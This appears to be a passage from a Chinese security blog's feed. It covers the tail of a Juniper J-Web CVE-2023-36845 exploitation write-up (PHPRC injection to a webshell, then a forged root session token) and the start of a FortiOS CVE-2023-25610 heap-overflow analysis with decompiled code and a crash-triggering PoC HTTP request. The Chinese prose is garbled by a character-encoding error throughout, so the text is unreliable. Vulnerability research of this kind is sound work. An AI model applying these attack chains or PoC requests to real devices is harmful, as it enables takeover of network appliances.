<p>å‚è€ƒè¿™ç¯‡æ–‡ç« å¾—çŸ¥ PHP åœ¨æ‰§è¡Œæ—¶ä¼šè¯»å–ä¸€äº›ç¯å¢ƒå˜é‡ï¼Œå…¶ä¸­ä¸€ä¸ªå˜é‡ä¸º PHPRCï¼Œç”¨äºæŒ‡å®š php.ini é…ç½®æ–‡ä»¶çš„è·¯å¾„ã€‚è€Œ PHP é…ç½®ä¸­åˆå­˜åœ¨ä¸€ä¸ªå«åš auto_prepend_file çš„å˜é‡ï¼Œé€šè¿‡æ­¤å˜é‡æŒ‡å®šä¸€ä¸ªæ–‡ä»¶ï¼Œå½“ PHP æ‰§è¡ŒçœŸæ­£çš„è„šæœ¬ä¹‹å‰ä¼šé¦–å…ˆåŒ…å«æ­¤æ–‡ä»¶ï¼Œç±»ä¼¼äºåœ¨æ–‡ä»¶å¼€å¤´è°ƒç”¨äº† require(auto_prepend_file)ã€‚</p>
<p>æ‰€ä»¥å¯ä»¥å…ˆåˆ©ç”¨æ–‡ä»¶ä¸Šä¼ æ¼æ´åœ¨ &#x2F;var&#x2F;tmp æ„é€ åˆé€‚çš„ php.ini æ–‡ä»¶ï¼Œå°† auto_prepend_file å€¼ä¹Ÿè®¾ç½®ä¸ºæ­¤æ–‡ä»¶è·¯å¾„ï¼Œç„¶ååœ¨æ–‡ä»¶ä¸­æ’å…¥ä¸€å¥è¯æœ¨é©¬ã€‚æ¥ç€åˆ©ç”¨ç¯å¢ƒå˜é‡æ³¨å…¥æ¼æ´ï¼Œä¿®æ”¹ PHPRC ä¸ºåˆšåˆšæ„é€ çš„é…ç½®æ–‡ä»¶ï¼Œæœ€åå®ç° require(&#x2F;var&#x2F;tmp&#x2F;preference.)ï¼Œæ‰§è¡Œä»»æ„ PHP ä»£ç ã€‚</p>
<p>å®ç°ä»£ç æ‰§è¡Œåªæ˜¯ç¬¬ä¸€æ­¥ï¼ŒJ-Web è¿è¡Œåœ¨ nobody æƒé™å¹¶ä¸”ä½äº chroot éš”ç¦»ç¯å¢ƒï¼Œè¿˜éœ€è¦è¿›ä¸€æ­¥æå‡æƒé™ã€‚åˆ†æ J-Web å„ä¸ªç»„ä»¶æ—¶å‘ç°ç”¨æˆ·ç™»å½•å session ä»¤ç‰Œä¼šè¢«å­˜æ”¾åœ¨ <code>(chroot)/var/sess</code> ç›®å½•ä¸‹ï¼Œå…·æœ‰ä¸€å®šæ ¼å¼ã€‚ä¾‹å¦‚ä»¥ä¸‹å†…å®¹ä¸º root ç”¨æˆ·ç™»å½•åäº§ç”Ÿçš„ä»¤ç‰Œæ–‡ä»¶ï¼š</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">language|s:7:&quot;english&quot;;device-hostname|s:6:&quot;NoName&quot;;device-model|s:4:&quot;vsrx&quot;;super-user|s:10:&quot;super-user&quot;;lsysuser|s:0:&quot;&quot;;tenantuser|s:0:&quot;&quot;;super|s:5:&quot;super&quot;;template-username|s:4:&quot;root&quot;;username|s:4:&quot;root&quot;;lsysname|s:0:&quot;&quot;;tenantname|s:0:&quot;&quot;;csrf_key|s:32:&quot;00000000000000000000000000000000&quot;;csrf_token|s:56:&quot;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa==&quot;;debug-asp|s:8:&quot;sp-0/0/0&quot;;debug-wizard-commit|b:1;jweb-authenticated|b:1;jweb-user-timeout|s:4:&quot;1800&quot;;jweb-last-access|i:1692806139;GLOBAL_MODE|s:7:&quot;Not set&quot;;junos-version|s:9:&quot;22.1R2.10&quot;;isModelL2NG|b:1;jweb-commit-mode|s:12:&quot;commit-check&quot;;TAP_MODE|b:0;SKYATP_ENABLED|b:0;DEVICE_ON_SDCLOUD|b:0;report_enabled|b:0;</span><br></pre></td></tr></table></figure></div>

<p>å‚ç…§è¿™ç§æ ¼å¼åˆ©ç”¨ä»£ç æ‰§è¡Œæ¼æ´åœ¨ sess ç›®å½•ä¸‹æ–°å»ºä¸€ä¸ªä»¤ç‰Œï¼Œä½¿ç”¨æ­¤ä»¤ç‰Œå³å¯ä»¥ç®¡ç†å‘˜èº«ä»½ç™»å½•åˆ° J-Web åå°ï¼Œæ§åˆ¶è®¾å¤‡çš„å¤§éƒ¨åˆ†é…ç½®ã€‚</p>
<p>å®é™…ä¸Šï¼Œç¯å¢ƒå˜é‡æ³¨å…¥æ¼æ´å¯ä»¥ä¸ä¾èµ–æ–‡ä»¶ä¸Šä¼ è€Œç›´æ¥å®ç°è¿œç¨‹ä»£ç æ‰§è¡Œï¼Œç”±äº web æœåŠ¡ä½¿ç”¨ stdin è¯»å–ç”¨æˆ·æ•°æ®ï¼Œæ‰€ä»¥å¯ä»¥å°† PHPRC ç›´æ¥æŒ‡å‘ &#x2F;dev&#x2F;fd&#x2F;0 æ–‡ä»¶ï¼Œç„¶ååœ¨è¯·æ±‚ä½“ä¸­æ³¨å…¥ç›¸å…³é…ç½®ï¼Œå³å¯æ‰§è¡Œä»»æ„ PHP ä»£ç ï¼Œå…·ä½“å¯å‚è€ƒç›¸å…³<a class="link"   href="https://github.com/kljunowsky/CVE-2023-36845" >å¼€æºå·¥å…·<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a> ã€‚</p>
<h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>é™¤æ–‡ä¸­æåˆ°çš„æ€è·¯å¤–ï¼Œè¿˜å¯ä»¥åˆ©ç”¨è®¾å¤‡æŸäº›åŠŸèƒ½ä» chroot ç¯å¢ƒä¸­é€ƒé€¸å‡ºæ¥ï¼Œé€ æˆæ›´åŠ ä¸¥é‡çš„å®‰å…¨é£é™©ã€‚æ·±å…¥åˆ©ç”¨å°±ç•™ç»™æ„Ÿå…´è¶£çš„æœ‹å‹è‡ªè¡Œæ¢ç´¢å§ã€‚</p>
<p>æœ¬æ¬¡ Juniper EX å’Œ SRX æ¼æ´åˆ©ç”¨äº† web æœåŠ¡å™¨ç¯å¢ƒå˜é‡é—®é¢˜å’Œæ–‡ä»¶ä¸Šä¼ ï¼Œå®ç°äº†è¾ƒä¸ºç¨³å®šçš„è¿œç¨‹ä»£ç æ‰§è¡Œã€‚æ¼æ´å±å®³è¾ƒå¤§ï¼Œç›®å‰å®˜æ–¹å·²ç»å‘å¸ƒäº†å®‰å…¨è¡¥ä¸ï¼Œå»ºè®®ç”¨æˆ·åŠæ—¶æ›´æ–°ã€‚</p>
<h2 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h2><p><a class="link"   href="https://supportportal.juniper.net/JSA72300" >https://supportportal.juniper.net/JSA72300<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://www.cnblogs.com/lisenlin/p/10302318.html" >https://www.cnblogs.com/lisenlin/p/10302318.html<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://forum.butian.net/index.php/share/1942" >https://forum.butian.net/index.php/share/1942<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://www.elttam.com/blog/env/#content" >https://www.elttam.com/blog/env/#content<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p><a class="link"   href="https://github.com/kljunowsky/CVE-2023-36845" >https://github.com/kljunowsky/CVE-2023-36845<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
]]></content>
      <categories>
        <category>æ¼æ´åˆ†æ</category>
      </categories>
  </entry>
  <entry>
    <title>CVE-2023-25610</title>
    <url>/2023/05/29/CVE-2023-25610/</url>
    <content><![CDATA[<p>2023 å¹´ 3 æœˆ 7 æ—¥ï¼ŒFortinet å‘å¸ƒäº†å½±å“ FortiOS ç®¡ç†ç«¯å£çš„æ¼æ´ CVE-2023-25610ï¼Œå®˜æ–¹è§£é‡Šè¯¥æ¼æ´ä¸º â€œå †å†…å­˜ä¸‹æº¢â€ï¼Œé€šè¿‡åˆ©ç”¨æ­¤æ¼æ´ï¼Œæœªç»æˆæƒçš„æ”»å‡»è€…<strong>å¯èƒ½</strong>å®ç°ä»»æ„ä»£ç æ‰§è¡Œï¼Œæœ¬æ–‡å¯¹è¯¥æ¼æ´è¿›è¡Œåˆ†æã€‚</p>
<span id="more"></span>

<h3 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h3><p>å…³äº FortiOS æœ¬åšå®¢ä¸­åŒ…å«æ•°ç¯‡å†å²æ–‡ç« ï¼Œè®¨è®ºäº†å¦‚ä½•è·å–å…¶ç³»ç»Ÿæƒé™ã€å¦‚ä½•é€šè¿‡æˆæƒéªŒè¯ä»¥åŠå¤ç°æ¼æ´æ—¶çš„åŸºæœ¬æ€è·¯ã€‚</p>
<p>åŒç†ï¼Œé’ˆå¯¹æ­¤æ¼æ´ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è¡¥ä¸å¯¹æ¯”çš„æ–¹å¼æ¥åˆ†æï¼Œæˆ–è€…æ˜¯ç¼–å†™ä¸€äº› FUZZ è„šæœ¬è¿›è¡Œæµ‹è¯•ã€‚</p>
<p>è€ƒè™‘ FortiOS æ›¾ç»å‡ºç°è¿‡çš„ç¼“å†²åŒºæº¢å‡ºç±»æ¼æ´ï¼ŒåŒ…æ‹¬è¿‘æœŸçš„ CVE-2022-42475ï¼ŒçŒœæµ‹ CVE-2023-25610 åº”è¯¥ä¹Ÿæ˜¯å‡ºç°åœ¨è§£æ HTTP è¯·æ±‚è¿‡ç¨‹ä¸­ã€‚åœ¨è¿›è¡Œè¡¥ä¸å¯¹æ¯”æ—¶æˆ‘ä»¬é‡ç‚¹å…³æ³¨å¤„ç†è¯·æ±‚çš„ç›¸å…³å‡½æ•°ï¼Œæœ€ç»ˆæ‰¾åˆ°ç–‘ä¼¼å…³é”®ä½ç½® util_readï¼Œæ­¤å‡½æ•°åœ¨ 7.x æ–°æ—§ç‰ˆæœ¬ä»£ç å¦‚ä¸‹</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// old</span></span><br><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">util_read</span><span class="params">(__int64 a1, <span class="type">void</span> **a2, _DWORD *a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// er15</span></span><br><span class="line">  __int64 v5; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">apr_pool_t</span> *v6; <span class="comment">// rdi</span></span><br><span class="line">  <span class="type">void</span> *v7; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// er14</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">char</span> *v10; <span class="comment">// rdi</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> src[<span class="number">8200</span>]; <span class="comment">// [rsp+10h] [rbp-2040h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v15; <span class="comment">// [rsp+2018h] [rbp-38h]</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  v5 = *(_QWORD *)(a1 + <span class="number">216</span>);</span><br><span class="line">  v6 = *(<span class="type">apr_pool_t</span> **)a1;</span><br><span class="line">  v15 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v7 = apr_palloc(v6, v5 + <span class="number">1</span>);</span><br><span class="line">  *a2 = <span class="built_in">memset</span>(v7, <span class="number">0</span>, v5 + <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v11 = ap_get_client_block(a1, src, <span class="number">0x2000</span>LL);</span><br><span class="line">    v9 = v11;</span><br><span class="line">    <span class="keyword">if</span> ( v11 &lt;= <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v8 = v3 + v11;</span><br><span class="line">    <span class="keyword">if</span> ( v5 &lt; v3 + v11 )</span><br><span class="line">    &#123;</span><br><span class="line">      v8 = v5;</span><br><span class="line">      v9 = v5 - v3;</span><br><span class="line">    &#125;</span><br><span class="line">    v10 = (<span class="type">char</span> *)*a2 + v3;</span><br><span class="line">    v3 = v8;</span><br><span class="line">    <span class="built_in">memcpy</span>(v10, src, v9);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( a3 )</span><br><span class="line">    *a3 = v3;</span><br><span class="line">  <span class="keyword">return</span> v15 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// new</span></span><br><span class="line">__int64 __fastcall <span class="title function_">util_read</span><span class="params">(_QWORD *a1, <span class="type">char</span> **a2, <span class="type">int</span> *a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// er13</span></span><br><span class="line">  __int64 v6; <span class="comment">// r14</span></span><br><span class="line">  _BYTE *v7; <span class="comment">// rax</span></span><br><span class="line">  __int64 v8; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// er14</span></span><br><span class="line">  <span class="type">size_t</span> v10; <span class="comment">// r15</span></span><br><span class="line">  <span class="type">void</span> *v11; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">size_t</span> v12; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// er15</span></span><br><span class="line">  <span class="type">char</span> *v14; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> *i; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">int</span> v16; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v18; <span class="comment">// [rsp+Ch] [rbp-34h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( sub_22038F0(<span class="number">11</span>, a2) )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = <span class="number">500</span>;</span><br><span class="line">    sub_CA4A60();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v6 = sub_22CDE00(*(qword_F34CC20 + <span class="number">88</span>));</span><br><span class="line">    v7 = sub_CA4A60();</span><br><span class="line">    <span class="keyword">if</span> ( v6 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v7 &amp;&amp; *v7 )</span><br><span class="line">        v18 = *(v6 + <span class="number">1588</span>);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        v18 = *(v6 + <span class="number">1592</span>);</span><br><span class="line">      v4 = <span class="number">400</span>;</span><br><span class="line">      <span class="keyword">if</span> ( a1[<span class="number">27</span>] &lt;= <span class="number">0x7FFFFFFF</span>uLL )</span><br><span class="line">      &#123;</span><br><span class="line">        v4 = ap_setup_client_block(a1, <span class="number">1LL</span>);</span><br><span class="line">        <span class="keyword">if</span> ( !v4 )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( ap_should_client_block(a1) )</span><br><span class="line">          &#123;</span><br><span class="line">            v8 = a1[<span class="number">27</span>];</span><br><span class="line">            v9 = v8;</span><br><span class="line">            <span class="keyword">if</span> ( v8 &lt;= <span class="number">0</span> || v18 &lt; v8 )</span><br><span class="line">            &#123;</span><br><span class="line">LABEL_20:</span><br><span class="line">              v4 = <span class="number">413</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              v10 = v8 + <span class="number">1</span>;</span><br><span class="line">              v11 = apr_palloc(*a1, v10);</span><br><span class="line">              v12 = v10;</span><br><span class="line">              v13 = <span class="number">0</span>;</span><br><span class="line">              v14 = <span class="built_in">memset</span>(v11, <span class="number">0</span>, v12);</span><br><span class="line">              *a2 = v14;</span><br><span class="line">              <span class="keyword">for</span> ( i = v14; ; i = *a2 )</span><br><span class="line">              &#123;</span><br><span class="line">                v16 = ap_get_client_block(a1, &amp;i[v13], v9 - v13);</span><br><span class="line">                <span class="keyword">if</span> ( v16 &lt;= <span class="number">0</span> )</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">                v13 += v16;</span><br><span class="line">                <span class="keyword">if</span> ( v13 &lt;= v9 )</span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="keyword">if</span> ( v13 &gt; v18 )</span><br><span class="line">                    <span class="keyword">goto</span> LABEL_20;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                  v13 = v9;</span><br><span class="line">                &#125;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="keyword">if</span> ( a3 )</span><br><span class="line">                *a3 = v13;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v4 = <span class="number">500</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>ç»è¿‡åˆ†æç¡®è®¤ï¼Œæ­¤å‡½æ•°ç”¨æ¥å¤„ç† POST è¯·æ±‚ä½“æ•°æ®ã€‚æˆ‘ä»¬çœ‹åˆ°å®ƒå‘ç”Ÿäº†æ˜¾è‘—å˜åŒ–ï¼Œæ–°ç‰ˆä¸­æ·»åŠ äº†ä¸€ç³»åˆ—å¤§å°æ£€æŸ¥ã€‚</p>
<p>é‚£ä¹ˆé—®é¢˜å‡ºç°åœ¨å“ªé‡Œå‘¢ï¼Ÿå‡½æ•°ä¸­ <code>a1 + 216</code> å˜é‡å¯¹åº” apache request_rec ç»“æ„ä¸­çš„ remaining æˆå‘˜(å¯èƒ½)ï¼Œè¡¨ç¤º body ä¸­è¿˜å‰©ä½™çš„æ•°æ®é•¿åº¦ã€‚ä»£ç è·å–åˆ°è¿™ä¸ªå€¼(v5)ï¼Œå¹¶åˆ†é… v5 + 1 å¤§å°çš„å†…å­˜(è®°ä¸º heap_start)ä¾›åç»­ä½¿ç”¨ã€‚</p>
<p>éšåè¿›å…¥å¾ªç¯ï¼Œè°ƒç”¨ ap_get_client_block å‡½æ•°æ¯æ¬¡ä»è¯·æ±‚ä¸­è·å– 0x2000 å¤§å°çš„æ•°æ®å—ï¼Œå°†å®ƒæ‹·è´åˆ° heap_start ã€‚è¿™é‡Œæ³¨æ„åˆ°å­˜åœ¨ä¸€ä¸ª int ç±»å‹å˜é‡ v3ï¼Œæ±‡ç¼–å¯¹åº” 32 ä½å¯„å­˜å™¨ã€‚å¾ªç¯ä¸­ä¸æ–­å¯¹å®ƒè¿›è¡Œç´¯åŠ æ“ä½œï¼Œä½†å¾ªç¯çš„è¾¹ç•Œä¾é  int64 ç±»å‹å˜é‡æ¥åˆ¤æ–­ï¼Œæ‰€ä»¥å½“ä¼ å…¥äº†è¾ƒå¤šçš„æ•°æ®æ—¶ï¼Œå˜é‡ v3 å°†å‘ç”Ÿæ•´æ•°æº¢å‡ºï¼Œå›ç»•æˆä¸€ä¸ª<strong>è´Ÿæ•°</strong>ã€‚</p>
<p>å½“ v3 å˜æˆè´Ÿæ•°æ—¶ï¼Œä»£ç ç»§ç»­è°ƒç”¨ memcpy å°è¯•å°†æ•°æ®å—æ‹·è´åˆ°å †å†…å­˜ã€‚æ­¤æ—¶æ–°çš„ç›®çš„åœ°å€å˜æˆ heap_start å‡å»æŸå€¼ï¼Œæ•°æ®å°†è¢«æ‹·è´åˆ° heap_start çš„ä½åœ°å€æ–¹å‘ï¼Œå¯èƒ½å¯¼è‡´æœªå®šä¹‰çš„è¡Œä¸ºã€‚</p>
<p>æ ¹æ®ä»¥ä¸Šåˆ†æï¼Œæƒ³è¦è®© v3 å‘ç”Ÿæ•´æ•°æº¢å‡ºï¼Œè‡³å°‘è¦åœ¨è¯·æ±‚ä½“ä¸­æ„é€  2GB çš„æ•°æ®ã€‚è¿™ä¸€ç‚¹å¯èƒ½éš¾ä»¥å®ç°ï¼Œæœ¬æ–‡æš‚ä¸åšè¿›ä¸€æ­¥è®¨è®ºã€‚</p>
<p>FortiGate æœ‰å‡ ä¸ªä¸åŒçš„ç‰ˆæœ¬ç³»åˆ—ï¼Œè€Œè¿™ä¸ªæ¼æ´åœ¨ä¸åŒç‰ˆæœ¬ä¸­çš„å½¢æ€ä¸åŒï¼Œæˆ‘ä»¬ä»¥ 6.0.x ä¸ºä¾‹å†æ¬¡åˆ†æã€‚</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">util_read</span><span class="params">(_QWORD *a1, _QWORD *a2, _DWORD *a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// er15</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// er13</span></span><br><span class="line">  <span class="type">void</span> *v7; <span class="comment">// rdi</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// eax</span></span><br><span class="line">  __int64 v11; <span class="comment">// [rsp+18h] [rbp-2048h]</span></span><br><span class="line">  <span class="type">char</span> src[<span class="number">8200</span>]; <span class="comment">// [rsp+20h] [rbp-2040h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v13; <span class="comment">// [rsp+2028h] [rbp-38h]</span></span><br><span class="line"></span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  v13 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v11 = a1[<span class="number">26</span>];</span><br><span class="line">  *a2 = sub_CC3750(*a1, (<span class="type">unsigned</span> <span class="type">int</span>)(v11 + <span class="number">1</span>));</span><br><span class="line">  sub_CDB860(<span class="string">&quot;[libapreq] util_read&quot;</span>, a1);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = sub_CE2BA0(a1, src, <span class="number">0x2000</span>LL);</span><br><span class="line">    v6 = v8;</span><br><span class="line">    <span class="keyword">if</span> ( v8 &lt;= <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v5 = v4 + v8;</span><br><span class="line">    sub_CDB770(a1);</span><br><span class="line">    <span class="keyword">if</span> ( v11 &lt; v5 )</span><br><span class="line">    &#123;</span><br><span class="line">      v6 = v11 - v4;</span><br><span class="line">      v5 = v11;</span><br><span class="line">    &#125;</span><br><span class="line">    v7 = (<span class="type">void</span> *)(*a2 + v4);</span><br><span class="line">    v4 = v5;</span><br><span class="line">    <span class="built_in">memcpy</span>(v7, src, v6);</span><br><span class="line">  &#125;</span><br><span class="line">  sub_CDB8B0(a1);</span><br><span class="line">  <span class="keyword">if</span> ( a3 )</span><br><span class="line">    *a3 = v4;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v13;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>é€»è¾‘å’Œ 7.x å¤§ä½“ç›¸åŒï¼Œä½†æ˜¯å­˜åœ¨å‡ ä¸ªå…³é”®å·®å¼‚ã€‚é¦–å…ˆåˆ†é…å†…å­˜æ—¶ä¸ä½¿ç”¨ remaining å­—æ®µï¼Œè€Œæ˜¯ç›´æ¥ä½¿ç”¨ Content-Length çš„å€¼ã€‚ç¬¬äºŒï¼Œalloc æ‰§è¡Œ + 1 æ“ä½œæ—¶ä¼šå°† __int64 ç±»å‹å˜é‡å¼ºåˆ¶è½¬æ¢ä¸º unsigned int ç±»å‹ï¼Œå­˜åœ¨æ•´æ•°æº¢å‡ºï¼Œè¿™ä¸€ç‚¹å’Œå†å²æ¼æ´ CVE-2022-42475 ç›¸ä¼¼ã€‚</p>
<p>æˆ‘ä»¬æ„é€ è¾ƒå¤§çš„ Content-Length å€¼ï¼Œåœ¨ alloc æ—¶å‘ç”Ÿ int æº¢å‡ºæˆªæ–­ï¼Œå¯¼è‡´åˆ†é…äº†è¾ƒå°çš„å†…å­˜ç©ºé—´ï¼Œè€Œåç»­å¾ªç¯æ‹·è´æ•°æ®æ—¶åˆä½¿ç”¨äº†è¾ƒå¤§çš„ CL å€¼ï¼Œæœ€ç»ˆå°†å¯¼è‡´å †å†…å­˜æº¢å‡ºã€‚</p>
<h3 id="åˆ©ç”¨åˆ†æ"><a href="#åˆ©ç”¨åˆ†æ" class="headerlink" title="åˆ©ç”¨åˆ†æ"></a>åˆ©ç”¨åˆ†æ</h3><p><strong>æ„Ÿè°¢â€å¤©ç©ºä¹‹åŸâ€åˆ†äº«äº†åœ¨å¤ç°è¯¥æ¼æ´æ—¶é‡åˆ°çš„ä¸€äº›é—®é¢˜ã€‚</strong></p>
<ol>
<li>æœ¬æ–‡æåŠçš„åˆ©ç”¨åˆ†æåŸºäº TLSv1.3ï¼Œåœ¨å…¶ä»– TLS ç‰ˆæœ¬ä¸Šå¯èƒ½å­˜åœ¨å·®å¼‚ã€‚</li>
<li>å¦‚æœä½¿ç”¨è„šæœ¬å’ŒæœåŠ¡è¿›è¡Œäº¤äº’ï¼Œéœ€è¦æ³¨æ„ openssl ç‰ˆæœ¬é—®é¢˜ï¼Œæ¯”å¦‚ python å»ºè®®ä½¿ç”¨ 3.11 ä»¥ä¸Šç‰ˆæœ¬ã€‚</li>
</ol>
<p>é¦–å…ˆæ¥æ„é€ ä¸€ä¸ªå¯ä»¥è§¦å‘æ¼æ´çš„ PoCï¼Œæ ¹æ®ä¹‹å‰çš„åˆ†æï¼Œåœ¨ POST è¯·æ±‚ä¸­ä¼ªé€ ä¸€ä¸ªè¾ƒå¤§çš„ Content-Length å€¼ï¼Œç„¶ååœ¨è¯·æ±‚ä½“ä¸­å¡«å……éšæœºæ•°æ®ï¼Œä¾‹å¦‚</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /login HTTP/1.1</span><br><span class="line">Host: 192.168.232.151</span><br><span class="line">Content-Length: 4296015872</span><br><span class="line">User-Agent: Mozilla/5.0</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&lt;random_long_data&gt;</span><br></pre></td></tr></table></figure></div>

<p>åœ¨ httpsd è¿›ç¨‹ä¸ŠæŒ‚è½½è°ƒè¯•å™¨ï¼Œç„¶åå‘é€è¯·æ±‚ï¼Œå¾—åˆ°ä»¥ä¸‹ç»“æœï¼š</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/cve-2023-25610-1.png"
                     
                ></p>
<p>æ®µé”™è¯¯å¯¼è‡´ç¨‹åºå´©æºƒï¼Œè§‚å¯Ÿå´©æºƒçš„åœ°å€ï¼Œrdi æ˜¯ä¸€ä¸ªè¶Šç•Œçš„å †åœ°å€ï¼Œé€šè¿‡æŸ¥çœ‹æ ˆå›æº¯åœ°å€ï¼Œå´©æºƒå°±å‘ç”Ÿåœ¨ util_read çš„ memcpy ä½ç½®ï¼Œæ‹·è´æ•°æ®æ—¶ç›®çš„åœ°å€å·²ç»è¶Šç•Œã€‚</p>
<p>æ ¹æ®ä»¥å¾€çš„ sslvpn åˆ©ç”¨ç»éªŒï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å †æº¢å‡ºè¦†ç›–è¯·æ±‚çš„ SSL ç»“æ„ä½“ï¼Œæ§åˆ¶å‡½æ•°æŒ‡é’ˆæ¥åŠ«æŒç¨‹åºæµç¨‹ã€‚ä½†æ˜¯ SSL ç»“æ„ä½“é€šå¸¸è¢«åˆ†é…åœ¨ 0x7f å¼€å¤´çš„é«˜åœ°å€ï¼Œè€Œå‘ç”Ÿè¶Šç•Œçš„ä½ç½®åœ¨è¾ƒä½åœ°å€ï¼Œæ— æ³•ç›´æ¥è¦†ç›– SSL ç»“æ„ã€‚</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/cve-2023-25610-2.png"
                     
                ></p>
<p>å‚è€ƒå†å²èµ„æ–™å‘ç°ï¼Œfortios ä¸­å†…å­˜åˆ†é…éƒ¨åˆ†ä½¿ç”¨äº† jemallocï¼Œè¿™ç§å†…å­˜ç®¡ç†ç­–ç•¥ä¸­åŒ…å«åœ°å€é‡ç”¨ä»¥åŠé’ˆå¯¹è¾ƒå¤§çš„åˆ†é…è¯·æ±‚é‡æ–°æ˜ å°„ä¸€å—å†…å­˜ç­‰æœºåˆ¶ã€‚</p>
